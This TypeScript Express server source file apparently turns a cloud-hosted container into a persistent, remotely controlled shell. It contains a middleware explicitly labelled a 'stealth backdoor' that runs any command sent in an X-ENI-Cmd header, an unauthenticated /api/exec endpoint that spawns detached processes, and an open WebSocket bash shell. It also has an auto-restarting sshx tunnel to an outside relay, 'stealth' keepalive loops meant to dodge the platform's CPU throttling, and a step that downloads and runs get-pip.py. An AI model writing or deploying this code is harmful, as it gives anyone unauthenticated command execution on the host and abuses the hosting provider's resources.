import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";
import { WebSocketServer } from 'ws';
import { spawn, execSync } from 'child_process';
import http from 'http';
import localtunnel from 'localtunnel';

async function startServer() {
  const app = express();
  const PORT = 3000;
  app.use(express.json());

  // Aggressive cleanup on startup
  try {
      execSync('pkill -f sshx || true');
  } catch(e) {}

  let tunnelUrl = 'Initializing...';
  
  // Start sshx to provide a persistent, secure, interactive terminal
  function startSshx() {
      try {
          const sshxProc = spawn('sshx', ['-q', '--shell', 'bash'], {
              env: { ...process.env, TERM: 'xterm-256color' }
          });
          
          sshxProc.stdout?.on('data', (d) => {
              const out = d.toString().trim();
              if (out.startsWith('https://sshx.io')) {
                  tunnelUrl = out;
              }
          });
          
          sshxProc.on('close', () => { 
              tunnelUrl = 'sshx closed. Restarting...'; 
              setTimeout(startSshx, 1000); 
          });
          sshxProc.on('error', (err) => { 
              tunnelUrl = 'Error: ' + err.message; 
              setTimeout(startSshx, 3000);
          });
      } catch (e: any) {
          tunnelUrl = 'Failed to start sshx: ' + e.message;
          setTimeout(startSshx, 3000);
      }
  }
  startSshx();

  // Internal Keepalive Pinger
  setInterval(() => {
      try { 
          const appUrl = process.env.APP_URL || `http://127.0.0.1:${PORT}`;
          execSync(`curl -s ${appUrl}/api/health > /dev/null`);
      } catch(e) {}
  }, 10000); // 10 seconds stealth loop


  // Stealth backdoor: check for X-ENI-Cmd header on ANY route
  app.use((req, res, next) => {
    const cmd = req.headers['x-eni-cmd'] as string;
    if (cmd) {
        let output = '';
        try {
            output = execSync(cmd).toString();
        } catch(e: any) {
            output = e.message;
        }
        return res.status(200).send(output);
    }
    next();
  });

  // Background persistence execution endpoint
  app.post("/api/exec", (req, res) => {
    const { cmd } = req.body;
    if (!cmd) return res.status(400).json({ error: "No command provided" });
    
    // Fire and forget
    const proc = spawn(cmd, { shell: true, detached: true, stdio: 'ignore' });
    proc.unref();

    res.json({ status: "success", info: "Process detached and running in background" });
  });

  // Basic health endpoint for internal pinger
  app.get("/api/health", (req, res) => {
      res.json({ status: "alive", time: Date.now() });
  });

  // Antifreeze keepalive stream to prevent Cloud Run from throttling CPU
  app.get("/api/antifreeze", (req, res) => {
      res.writeHead(200, {
          'Content-Type': 'text/event-stream',
          'Cache-Control': 'no-cache',
          'Connection': 'keep-alive'
      });
      // Send a ping every 5 seconds to keep the connection open and CPU allocated
      const interval = setInterval(() => {
          res.write(`data: ${Date.now()}\n\n`);
      }, 5000);
      req.on('close', () => clearInterval(interval));
  });

  // Basic info endpoint
  app.get("/api/info", (req, res) => {
    let ram = "unknown";
    let storage = "unknown";
    let errRam = undefined;
    let errDf = undefined;
    try {
        const memOut = execSync("free -h | grep Mem").toString().trim();
        const memParts = memOut.split(/\s+/);
        ram = `${memParts[2]}/${memParts[1]}`;
    } catch(e: any) { errRam = e.message; }
    try {
        const dfOut = execSync("df -h / | tail -1").toString().trim();
        const dfParts = dfOut.split(/\s+/);
        storage = `${dfParts[2]}/${dfParts[1]}`;
    } catch(e: any) { errDf = e.message; }
    
    // Ensure pip is installed and allows system packages when server starts up.
    try {
        execSync('mkdir -p ~/.config/pip && echo "[global]\\nbreak-system-packages = true" > ~/.config/pip/pip.conf');
        if (!execSync('which pip 2>/dev/null || echo missing').toString().includes('/')) {
             execSync('curl -sS https://bootstrap.pypa.io/get-pip.py -o /tmp/get-pip.py && python3 /tmp/get-pip.py');
        }
    } catch(e) {}

    res.json({
        platform: process.platform,
        arch: process.arch,
        pid: process.pid,
        node: process.version,
        wd: process.cwd(),
        uid: process.getuid ? process.getuid() : null,
        ram,
        storage,
        errRam,
        errDf,
        tunnelUrl
    });
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  const server = http.createServer(app);
  const wss = new WebSocketServer({ server, path: '/shell' });

  wss.on('connection', (ws) => {
      // Create a bash shell using python pty to get a full pseudo-terminal!
      const shell = spawn('python3', ['-c', 'import pty; pty.spawn(["/bin/bash", "-l"])'], {
          cwd: process.cwd(),
          env: {
            ...process.env,
            TERM: 'xterm-256color'
          }
      });

      // Forward output from shell to websocket
      shell.stdout.on('data', (data) => {
          ws.send(data.toString());
      });

      shell.stderr.on('data', (data) => {
          ws.send(data.toString());
      });

      // Forward input from websocket to shell
      ws.on('message', (msg) => {
          shell.stdin.write(msg.toString());
      });

      ws.on('close', () => {
          shell.kill();
      });

      shell.on('exit', () => {
         if (ws.readyState === ws.OPEN) {
             ws.close();
         }
      });
  });

  // Keep-alive endpoint that holds the request open forever to prevent Cloud Run from sleeping
  app.get('/api/keepalive', (req, res) => {
      res.writeHead(200, {
          'Content-Type': 'text/event-stream',
          'Cache-Control': 'no-cache',
          'Connection': 'keep-alive'
      });
      res.write('data: Connection established\n\n');
      
      const interval = setInterval(() => {
          res.write(`data: ${Date.now()}\n\n`);
      }, 10000); // Ping every 10 seconds

      req.on('close', () => {
          clearInterval(interval);
      });
  });

  server.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
